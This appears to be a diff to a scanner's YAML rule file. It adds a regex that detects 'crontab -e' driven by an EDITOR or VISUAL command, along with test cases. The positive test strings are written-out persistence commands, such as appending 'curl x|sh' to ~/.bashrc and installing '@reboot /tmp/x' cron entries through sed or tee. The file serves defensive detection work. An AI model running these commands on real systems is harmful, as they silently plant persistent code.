@@ -424,6 +424,13 @@ rules:
         # -l` as evidence (review 98, real skills). A pipeline that lists, edits and reinstalls still
         # ends in `crontab -`.
         - '\bcrontab\s+(?:-u\s+\S+\s+)?-(?![lreu]\b)|\bcrontab\s+-u\s+\S+\s+(?!-)\S|/etc/cron\.[a-z]+/'
+        # ...unless the editor is a command: with EDITOR or VISUAL set (on the line, through `env`,
+        # or exported earlier in the script) `crontab -e` installs what that command writes and no
+        # person sees an editor (`EDITOR="sed -i '$a ...'" crontab -e`, `VISUAL=tee crontab -e < f`).
+        # Bounded and linear: the span reads at most 4,000 characters and stops at the next
+        # assignment (the last one before `crontab -e` is the one it runs with), so a script of many
+        # assignments is read once, not once per assignment.
+        - '\b(?:EDITOR|VISUAL)=\S(?:(?!EDITOR=)(?!VISUAL=)[\s\S]){0,4000}?\bcrontab\s+(?:-u\s+\S+\s+)?-e\b'
         # A unit path that is being WRITTEN. The bare path was listed and an
         # uninstaller names exactly the same paths as the installer: `pi-hole`'s
         # `uninstall.sh` runs `rm -f /etc/systemd/system/pihole-FTL.service` and then
@@ -469,6 +476,11 @@ rules:
         - "echo 'curl x|sh' >> ~/.bashrc"
         - "crontab -l | { cat; echo '@reboot /tmp/x'; } | crontab -"
         - "crontab -u root -"
+        - "EDITOR=\"sed -i '$a * * * * * /tmp/x'\" crontab -e"
+        - "env VISUAL=tee crontab -e < job.txt"
+        - "EDITOR=tee sudo crontab -u root -e < job.txt"
+        - "export VISUAL=tee\ncrontab -e < job.txt"
+        - "export EDITOR='sed -i 1i@reboot\\ /tmp/x'\nprepare\ncrontab -e"
         - "cp agent.service /etc/systemd/system/agent.service"
         - "systemctl enable agent.service"
       negative:
@@ -480,6 +492,8 @@ rules:
         - "id -u someone"
         - "crontab -l > \"$EVIDENCE_DIR/crontab_current.txt\""
         - "crontab -u alice -l"
+        - "echo 'Run crontab -e to edit your schedule'"
+        - "crontab -e"
         - "echo '--- User LaunchAgents ---'"
         - "printf 'inspecting /etc/systemd/system contents\\n'"
 
